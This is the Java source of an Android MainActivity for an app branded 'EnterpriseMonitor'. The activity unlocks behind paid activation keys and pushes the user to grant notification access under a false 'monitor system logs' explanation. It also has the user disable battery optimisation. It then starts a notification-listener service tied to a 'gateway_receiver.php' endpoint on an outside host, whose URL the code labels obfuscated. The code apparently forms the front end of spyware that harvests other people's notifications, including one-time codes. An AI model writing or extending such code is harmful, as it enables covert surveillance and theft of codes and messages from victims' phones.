package com.enterprise.devicemonitor;

import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.button.MaterialButton;
import com.google.gson.JsonObject;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    // ========================================================
    // OBFUSCATED ENDPOINT STORAGE - Dynamic URL Reconstruction
    // ========================================================
    private static final String BASE_URL_PART_1 = "https://bhoomiproperty.foodmania.us.cc/";
    private static final String BASE_URL_PART_2 = "central_server/";
    private String BASE_URL;

    // API Endpoints
    private static final String VERIFY_ENDPOINT = "verify_license.php";
    private static final String GATEWAY_ENDPOINT = "gateway_receiver.php";

    // Shared Preferences Keys
    private static final String PREFS_NAME = "EnterpriseMonitorPrefs";
    private static final String KEY_IS_AUTHORIZED = "is_authorized";
    private static final String KEY_ACTIVATION_KEY = "activation_key";
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String KEY_SERVICE_RUNNING = "service_running";
    private static final String KEY_EVENTS_COUNT = "events_count";
    private static final String KEY_UPTIME_MINUTES = "uptime_minutes";

    // UI Components - Phase 1
    private FrameLayout phase1Container;
    private EditText activationKeyInput;
    private MaterialButton authorizeButton;
    private ProgressBar authorizationProgress;
    private TextView errorMessage;
    private TextView whatsappSupportLink;

    // UI Components - Phase 2
    private FrameLayout phase2Container;
    private View toggleThumb;
    private View toggleSwitchFrame;
    private TextView toggleStatusText;
    private MaterialButton disconnectButton;
    private TextView statusIndicatorText;
    private TextView metricEventsCount;
    private TextView metricUptimeMinutes;

    // Network Client
    private OkHttpClient httpClient;
    private SharedPreferences sharedPreferences;

    // State Management
    private boolean isToggleActive = false;
    private String deviceId;
    private String activationKey;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Reconstruct obfuscated BASE_URL at runtime
        BASE_URL = BASE_URL_PART_1 + BASE_URL_PART_2;

        // Initialize components
        initializeSharedPreferences();
        initializeNetworkClient();
        initializeUIComponents();
        initializeDeviceIdentifier();
        restoreApplicationState();

        // Check authorization status
        if (isClientAuthorized()) {
            switchToPhase2();
        } else {
            switchToPhase1();
        }
    }

    // ========================================================
    // INITIALIZATION METHODS
    // ========================================================

    private void initializeSharedPreferences() {
        sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
    }

    private void initializeNetworkClient() {
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(20, TimeUnit.SECONDS)
                .writeTimeout(20, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
    }

    private void initializeUIComponents() {
        // Phase 1 Components
        phase1Container = findViewById(R.id.phase1_container);
        activationKeyInput = findViewById(R.id.activation_key_input);
        authorizeButton = findViewById(R.id.authorize_button);
        authorizationProgress = findViewById(R.id.authorization_progress);
        errorMessage = findViewById(R.id.error_message);
        whatsappSupportLink = findViewById(R.id.whatsapp_support_link);

        // Phase 2 Components
        phase2Container = findViewById(R.id.phase2_container);
        toggleThumb = findViewById(R.id.toggle_thumb);
        toggleSwitchFrame = findViewById(R.id.toggle_switch_frame);
        toggleStatusText = findViewById(R.id.toggle_status_text);
        disconnectButton = findViewById(R.id.disconnect_button);
        statusIndicatorText = findViewById(R.id.status_indicator_text);
        metricEventsCount = findViewById(R.id.metric_events_count);
        metricUptimeMinutes = findViewById(R.id.metric_uptime_mins);

        // Phase 1 Click Listeners
        authorizeButton.setOnClickListener(v -> handleAuthorizationRequest());
        whatsappSupportLink.setOnClickListener(v -> openWhatsAppSupport());

        // Phase 2 Click Listeners
        toggleSwitchFrame.setOnClickListener(v -> handleToggleSwitchPress());
        disconnectButton.setOnClickListener(v -> handleDisconnectRequest());
    }

    private void initializeDeviceIdentifier() {
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private void restoreApplicationState() {
        metricEventsCount.setText(String.valueOf(
                sharedPreferences.getInt(KEY_EVENTS_COUNT, 0)
        ));
        metricUptimeMinutes.setText(String.valueOf(
                sharedPreferences.getInt(KEY_UPTIME_MINUTES, 0)
        ));

        if (sharedPreferences.getBoolean(KEY_SERVICE_RUNNING, false)) {
            activateToggleSwitch(true);
        }
    }

    // ========================================================
    // PHASE 1: CLIENT VERIFICATION & AUTHORIZATION
    // ========================================================

    private void handleAuthorizationRequest() {
        String inputKey = activationKeyInput.getText().toString().trim();

        if (inputKey.isEmpty()) {
            showErrorMessage("Activation key cannot be empty");
            return;
        }

        if (inputKey.length() < 8) {
            showErrorMessage("Activation key must be at least 8 characters");
            return;
        }

        activationKey = inputKey;
        clearErrorMessage();
        showAuthorizationProgress(true);
        authorizeButton.setEnabled(false);

        // Execute authorization in background thread
        performLicenseVerification(inputKey);
    }

    private void performLicenseVerification(String licenseKey) {
        new Thread(() -> {
            try {
                // Construct JSON payload
                JsonObject jsonPayload = new JsonObject();
                jsonPayload.addProperty("license_key", licenseKey);
                jsonPayload.addProperty("device_id", deviceId);
                jsonPayload.addProperty("timestamp", System.currentTimeMillis());
                jsonPayload.addProperty("api_version", Build.VERSION.SDK_INT);

                String jsonString = jsonPayload.toString();
                RequestBody requestBody = RequestBody.create(
                        jsonString,
                        MediaType.parse("application/json; charset=utf-8")
                );

                String verifyUrl = BASE_URL + VERIFY_ENDPOINT;
                Request request = new Request.Builder()
                        .url(verifyUrl)
                        .post(requestBody)
                        .addHeader("Content-Type", "application/json")
                        .addHeader("User-Agent", "EnterpriseMonitor/1.0")
                        .addHeader("Device-ID", deviceId)
                        .build();

                Response response = httpClient.newCall(request).execute();

                runOnUiThread(() -> {
                    showAuthorizationProgress(false);
                    authorizeButton.setEnabled(true);

                    if (response.isSuccessful()) {
                        String responseBody = response.body() != null ?
                                response.body().string() : "";

                        if (responseBody.contains("\"status\":\"success\"") ||
                                responseBody.contains("\"authorized\":true")) {
                            // Save authorization state
                            saveAuthorizationState(licenseKey);
                            Toast.makeText(MainActivity.this,
                                    "Authorization successful",
                                    Toast.LENGTH_SHORT).show();
                            switchToPhase2();
                        } else {
                            showErrorMessage("Invalid activation key");
                        }
                    } else {
                        showErrorMessage("Server verification failed. HTTP " +
                                response.code());
                    }

                    response.close();
                });

            } catch (IOException e) {
                runOnUiThread(() -> {
                    showAuthorizationProgress(false);
                    authorizeButton.setEnabled(true);
                    showErrorMessage("Network error: " + e.getMessage());
                });
            }
        }).start();
    }

    private void saveAuthorizationState(String licenseKey) {
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean(KEY_IS_AUTHORIZED, true);
        editor.putString(KEY_ACTIVATION_KEY, licenseKey);
        editor.putString(KEY_DEVICE_ID, deviceId);
        editor.apply();
    }

    private boolean isClientAuthorized() {
        return sharedPreferences.getBoolean(KEY_IS_AUTHORIZED, false);
    }

    // ========================================================
    // PHASE 2: STREAMING CONSOLE & TELEMETRY CONTROL
    // ========================================================

    private void handleToggleSwitchPress() {
        if (!isToggleActive) {
            // Switching ON - Check permissions first
            checkAndRequestPermissions();
        } else {
            // Switching OFF
            deactivateToggleSwitch();
        }
    }

    private void checkAndRequestPermissions() {
        boolean notificationAccessEnabled = isNotificationAccessEnabled();
        boolean batteryOptimizationIgnored = isBatteryOptimizationIgnored();

        if (!notificationAccessEnabled) {
            showPermissionDialog(
                    "Enable Notification Access",
                    "This app requires notification access to monitor system logs. " +
                            "Please enable it in Settings.",
                    () -> openNotificationAccessSettings()
            );
            return;
        }

        if (!batteryOptimizationIgnored) {
            showPermissionDialog(
                    "Disable Battery Optimization",
                    "For reliable data transmission, please disable battery optimization for this app.",
                    () -> openBatteryOptimizationSettings()
            );
            return;
        }

        // All permissions granted - activate service
        activateToggleSwitch(true);
        startTelemetryService();
    }

    private void activateToggleSwitch(boolean active) {
        isToggleActive = active;

        if (active) {
            toggleThumb.animate()
                    .translationX(56)
                    .setDuration(300)
                    .start();
            toggleSwitchFrame.setBackground(getDrawable(R.drawable.toggle_background_on));
            toggleStatusText.setText("DATA TRANSMISSION ACTIVE");
            statusIndicatorText.setText("Status: Online");
            statusIndicatorText.setTextColor(getColor(R.color.status_online));

            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putBoolean(KEY_SERVICE_RUNNING, true);
            editor.apply();
        } else {
            deactivateToggleSwitch();
        }
    }

    private void deactivateToggleSwitch() {
        isToggleActive = false;

        toggleThumb.animate()
                .translationX(0)
                .setDuration(300)
                .start();
        toggleSwitchFrame.setBackground(getDrawable(R.drawable.toggle_background_off));
        toggleStatusText.setText("TAP TO START DATA TRANSMISSION");
        statusIndicatorText.setText("Status: Offline");
        statusIndicatorText.setTextColor(getColor(R.color.status_offline));

        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean(KEY_SERVICE_RUNNING, false);
        editor.apply();
    }

    private void handleDisconnectRequest() {
        deactivateToggleSwitch();
        stopTelemetryService();

        // Clear authorization
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean(KEY_IS_AUTHORIZED, false);
        editor.putBoolean(KEY_SERVICE_RUNNING, false);
        editor.apply();

        switchToPhase1();
        Toast.makeText(this, "Client disconnected", Toast.LENGTH_SHORT).show();
    }

    // ========================================================
    // SERVICE MANAGEMENT
    // ========================================================

    private void startTelemetryService() {
        Intent serviceIntent = new Intent(this, MyNotificationListener.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void stopTelemetryService() {
        Intent serviceIntent = new Intent(this, MyNotificationListener.class);
        stopService(serviceIntent);
    }

    // ========================================================
    // PERMISSION CHECKING & SYSTEM SETTINGS
    // ========================================================

    // 🔥 FIX: Puraane buggy code ko hata kar robust custom OS compatible logic joda hai
    private boolean isNotificationAccessEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true; // System DB mein permission completely active hai!
                    }
                }
            }
        }
        return false;
    }

    private boolean isBatteryOptimizationIgnored() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.os.PowerManager pm =
                    (android.os.PowerManager) getSystemService(POWER_SERVICE);
            return pm.isIgnoringBatteryOptimizations(getPackageName());
        }
        return true;
    }

    private void openNotificationAccessSettings() {
        Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        startActivity(intent);
    }

    private void openBatteryOptimizationSettings() {
        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        intent.setData(Uri.parse("package:" + getPackageName()));
        try {
            startActivity(intent);
        } catch (Exception e) {
            Toast.makeText(this,
                    "Could not open battery optimization settings",
                    Toast.LENGTH_SHORT).show();
        }
    }

    // ========================================================
    // UI STATE MANAGEMENT
    // ========================================================

    private void switchToPhase1() {
        phase1Container.setVisibility(View.VISIBLE);
        phase2Container.setVisibility(View.GONE);
        activationKeyInput.setText("");
    }

    private void switchToPhase2() {
        phase1Container.setVisibility(View.GONE);
        phase2Container.setVisibility(View.VISIBLE);
    }

    private void showErrorMessage(String message) {
        errorMessage.setText(message);
        errorMessage.setVisibility(View.VISIBLE);
    }

    private void clearErrorMessage() {
        errorMessage.setText("");
        errorMessage.setVisibility(View.GONE);
    }

    private void showAuthorizationProgress(boolean show) {
        authorizationProgress.setVisibility(show ? View.VISIBLE : View.GONE);
        authorizeButton.setVisibility(show ? View.GONE : View.VISIBLE);
    }

    // ========================================================
    // EXTERNAL INTENT HANDLERS
    // ========================================================

    private void openWhatsAppSupport() {
        String phoneNumber = "919274459080"; // Replace with actual support number
        String message = "Hello, I need help with Key 🔐 activation.";

        String url = "https://wa.me/" + phoneNumber +
                "?text=" + Uri.encode(message);

        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(url));

        try {
            startActivity(intent);
        } catch (Exception e) {
            Toast.makeText(this,
                    "WhatsApp is not installed",
                    Toast.LENGTH_SHORT).show();
        }
    }

    private void showPermissionDialog(String title, String message, Runnable onConfirm) {
        new androidx.appcompat.app.AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(message)
                .setPositiveButton("Open Settings", (dialog, which) -> {
                    if (onConfirm != null) {
                        onConfirm.run();
                    }
                })
                .setNegativeButton("Cancel", null)
                .show();
    }

    // ========================================================
    // LIFECYCLE METHODS
    // ========================================================

    @Override
    protected void onResume() {
        super.onResume();
        // 🔥 FIX: State loops ko handle karne ke liye conditions optimized ki hain
        if (isToggleActive) {
            if (!isNotificationAccessEnabled() || !isBatteryOptimizationIgnored()) {
                deactivateToggleSwitch();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (httpClient != null) {
            httpClient.dispatcher().executorService().shutdown();
        }
    }

    public String getBaseUrl() {
        return BASE_URL;
    }

    public String getGatewayEndpoint() {
        return BASE_URL + GATEWAY_ENDPOINT;
    }

    public String getDeviceId() {
        return deviceId;
    }

    public OkHttpClient getHttpClient() {
        return httpClient;
    }
}
